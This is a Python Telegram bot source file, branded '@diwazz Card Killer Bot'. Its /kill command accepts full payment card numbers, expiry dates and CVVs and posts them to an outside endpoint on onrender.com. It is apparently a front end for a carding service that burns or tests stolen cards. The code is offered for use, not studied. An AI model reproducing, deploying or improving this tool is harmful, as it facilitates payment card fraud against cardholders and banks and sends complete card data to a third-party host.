import requests
import telebot
import re
import logging

# >>> DO NOT PASTE YOUR REAL TOKEN PUBLICLY <<<
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
API_URL = "https://killbot-a7mt.onrender.com/kill"

logging.basicConfig(level=logging.INFO)
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, ("<b>Welcome! @diwazz Card Killer Bot.</b>\n\n"
                           "Use <code>/kill CC|MM|YY|CVV</code> to start."), parse_mode='HTML')

@bot.message_handler(commands=['kill'])
def handle_kill_command(message):
    text = message.text or ""
    # remove command part if Telegram includes bot username: "/kill@MyBot 4242..."
    parts = text.split(' ', 1)
    if len(parts) < 2 or not parts[1].strip():
        bot.reply_to(message, "<b>Please provide card details in format:</b>\n<code>CC|MM|YY|CVV</code>", parse_mode='HTML')
        return

    command_text = parts[1].strip()
    # accept expiry year 2 or 4 digits, cvv 3-4, 16-digit PAN
    match = re.match(r'^(\d{12,19})\|(\d{2})\|(\d{2,4})\|(\d{3,4})$', command_text)
    if not match:
        bot.reply_to(message, "<b>Invalid format. Use:</b> <code>CC|MM|YY|CVV</code>", parse_mode='HTML')
        return

    full_cc_string = match.group(0)

    # mask card when showing to user (only show first6 + last4)
    pan = match.group(1)
    masked = pan[:6] + '*' * (len(pan)-10) + pan[-4:] if len(pan) > 10 else pan[:4] + '****' + pan[-4:]

    sent_message = bot.reply_to(message, f"<i>Kill initiated for <code>{masked}|{match.group(2)}|{match.group(3)}|{match.group(4)}</code>. Please wait...</i>", parse_mode='HTML')

    payload = {
        'chat_id': message.chat.id,
        'message_id': sent_message.message_id,
        'card': full_cc_string
    }

    headers = {
        'Content-Type': 'application/json',
        # add an authorization header if API expects it:
        # 'Authorization': 'Bearer YOUR_API_KEY'
    }

    try:
        resp = requests.post(API_URL, json=payload, headers=headers, timeout=20)
    except requests.exceptions.RequestException as e:
        logging.exception("Request to API failed")
        bot.edit_message_text(f"<b>Error:</b> Could not contact API. <code>{e}</code>",
                              chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')
        return

    # useful debug: include resp.text in logs (don't print sensitive data publicly)
    logging.info("API status: %s body: %s", resp.status_code, resp.text[:1000])

    if resp.status_code == 200:
        bot.edit_message_text(f"<b>Done:</b> API accepted the task. Response: <code>{resp.text}</code>",
                              chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')
    elif resp.status_code == 405:
        bot.edit_message_text("<b>Error:</b> API replied 405 Method Not Allowed. "
                              "That means this endpoint doesn't accept the method you used (POST/GET mismatch).",
                              chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')
    else:
        bot.edit_message_text(f"<b>Error:</b> API responded with status {resp.status_code}. Response body: <code>{resp.text}</code>",
                              chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')

if __name__ == "__main__":
    bot.polling(none_stop=True)
